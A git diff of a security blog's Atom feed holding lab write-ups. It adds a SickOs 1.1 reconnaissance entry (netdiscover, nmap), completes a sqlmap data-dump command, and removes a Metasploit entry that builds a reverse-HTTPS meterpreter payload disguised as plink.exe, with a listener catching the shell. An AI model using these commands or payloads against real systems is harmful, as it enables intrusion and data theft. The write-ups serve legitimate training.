@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-05-17T13:37:43-05:00</updated>
+  <updated>2016-05-19T14:58:44-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -12,6 +12,42 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[sickos:1.1]]></title>
+    <link href="http://wg135.github.io/blog/2016/05/18/sickos-1-dot-1/"/>
+    <updated>2016-05-18T12:50:37-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/05/18/sickos-1-dot-1</id>
+    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/csharp-vulnjson,134/">Vulhub</a></p>
+
+<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/sickos/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.79.178 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.79.178 -p-</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/sickos/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Looks like port 22 and port 3218 are openning.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Csharp: VulnJson]]></title>
@@ -106,7 +142,7 @@
 <p>Then in the terminal, we try:</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -r test.txt  --level 5 --risk 3 --threads 10 -p "username" --dum</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -r test.txt  --level 5 --risk 3 --threads 10 -p "username" --dump</span></code></pre></td></tr></table></div></figure>
 
 
 <p>since there is a parameter username in the post request, so we use that as a parameter for sqlmap</p>
@@ -2328,77 +2364,6 @@ The web application will check the path extension and verify that it is a .png f
 <p>exploit:</p>
 
 <p><code>http://192.168.79.162/xss/example9.php#&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Metasploit Generates Payload]]></title>
-    <link href="http://wg135.github.io/blog/2016/02/26/metasploit-generates-payload/"/>
-    <updated>2016-02-26T15:47:27-06:00</updated>
-    <id>http://wg135.github.io/blog/2016/02/26/metasploit-generates-payload</id>
-    <content type="html"><![CDATA[<h3>This note is for generating payload using Metasploit.</h3>
-
-<h3>Use <code>generate</code> command:</h3>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use payload/windows/meterpreter/reverse_https
-</span><span class='line'>
-</span><span class='line'>msf payload(reverse_https) &gt; set lhost 192.168.79.156
-</span><span class='line'>
-</span><span class='line'>msf payload(reverse_https) &gt; set lport 4444
-</span><span class='line'>
-</span><span class='line'>msf payload(reverse_https) &gt; generate -t exe -f false.exe -x /var/www/html/plink.exe
-</span></code></pre></td></tr></table></div></figure>
-
-
-<!--more-->
-
-
-<p>Here I use reverse_https to generate payload and inject to plink.exe as a template.</p>
-
-<p>options:</p>
-
-<p><code>-t  ------ payload format</code></p>
-
-<p><code>-f  ------ payload output</code></p>
-
-<p><code>-x  ------ injection template</code></p>
-
-<p>This step will generate reverse https payload and use plink.exe as a template, write to file false.exe and send it to the target.</p>
-
-<p>In order to get the reverse https shell, I have to set up multi handler:</p>
-
-<h3>Set up <code>multi handler</code></h3>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/handler 
-</span><span class='line'>
-</span><span class='line'>msf exploit(handler) &gt; set payload windows/meterpreter/reverse_https
-</span><span class='line'>
-</span><span class='line'>msf exploit(handler) &gt; set lhost 192.168.79.156
-</span><span class='line'>
-</span><span class='line'>msf exploit(handler) &gt; set lport 4444
-</span><span class='line'>
-</span><span class='line'>msf exploit(handler) &gt; exploit </span></code></pre></td></tr></table></div></figure>
-
-
-<p>Once the victim run the false.exe on the target machine, it will initlize a reverse https connection to the attacker.</p>
-
-<p><img src="http://wg135.github.io/images/blog/metasplot_payload/metasploit_payload_1.JPG" title="[title text [alt text]]" ></p>
 ]]></content>
   </entry>
   
